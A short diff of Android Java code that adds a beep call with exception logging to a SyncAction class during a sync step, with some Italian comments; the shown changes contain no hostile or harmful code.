@@ -9,11 +9,14 @@
 
 package com.android.service.action;
 
+import java.io.IOException;
 import java.util.Date;
 import java.util.Vector;
 
 import org.json.JSONObject;
 
+import com.android.service.Core;
+import com.android.service.Status;
 import com.android.service.Trigger;
 import com.android.service.action.sync.Protocol;
 import com.android.service.action.sync.ProtocolException;
@@ -103,6 +106,13 @@ public abstract class SyncAction extends SubActionSlow {
 			// Questa chiamata da una RunTimeException
 			// Toast.makeText(Status.getAppContext(), "Sync action",
 			// Toast.LENGTH_LONG).show();
+			try {
+				Core.beep(Status.getAppContext());
+			} catch (Exception e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+			}
 		}
 
 		// agentManager.reload(AgentType.AGENT_DEVICE);
